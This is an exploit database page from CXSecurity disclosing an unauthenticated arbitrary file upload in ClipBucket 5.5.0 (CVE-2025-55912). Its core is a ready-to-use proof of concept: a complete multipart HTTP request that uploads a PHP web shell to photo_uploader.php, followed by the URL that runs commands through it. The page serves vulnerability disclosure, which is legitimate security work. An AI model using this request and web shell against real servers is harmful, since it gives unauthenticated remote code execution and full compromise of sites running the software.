---
title: ClipBucket 5.5.0 Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2026020012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-14
fetch_date: 2026-02-15T04:14:46.621048
---

# ClipBucket 5.5.0 Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ClipBucket 5.5.0 Arbitrary File Upload** **2026.02.14**  Credit:  **[Mukundsinh Solanki (r00td3str0y3r)](https://cxsecurity.com/author/Mukundsinh%2BSolanki%2B%28r00td3str0y3r%29/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-55912](https://cxsecurity.com/cveshow/CVE-2025-55912/ "Click to see CVE-2025-55912")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: ClipBucket 5.5.0 - Arbitrary File Upload
# Google Dork: N/A
# Date: 2025-09-11
# Exploit Author: Mukundsinh Solanki (r00td3str0y3r)
# Vendor Homepage: https://clipbucket.com
# Software Link: https://github.com/MacWarrior/clipbucket-v5
# Version: <= 5.5.0
# Tested on: Ubuntu 20.04 LTS, PHP 7.4
# CVE: CVE-2025-55912
## Vulnerability Description:
ClipBucket <= 5.5.0 suffers from an unauthenticated arbitrary file upload
vulnerability in `upload/actions/photo\_uploader.php`. Missing access
controls and insufficient validation of uploaded files allow an attacker to
upload a crafted PHP file and execute it remotely, leading to full remote
code execution (RCE).
## PoC Request:
POST /upload/actions/photo\_uploader.php HTTP/1.1
Host: victim.com
Content-Type: multipart/form-data; boundary=----BOUND
------BOUND
Content-Disposition: form-data; name="Filedata"; filename="shell.php"
Content-Type: application/x-php
<?php system($\_GET['cmd']); ?>
------BOUND--
The file is uploaded without authentication. The attacker can then access
it:
http://victim.com/files/photos/shell.php?cmd=id
## Impact:
- Unauthenticated remote code execution (RCE)
- Full compromise of target application and underlying server
Regards,
Mukundsinh Solanki
+916355251151

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top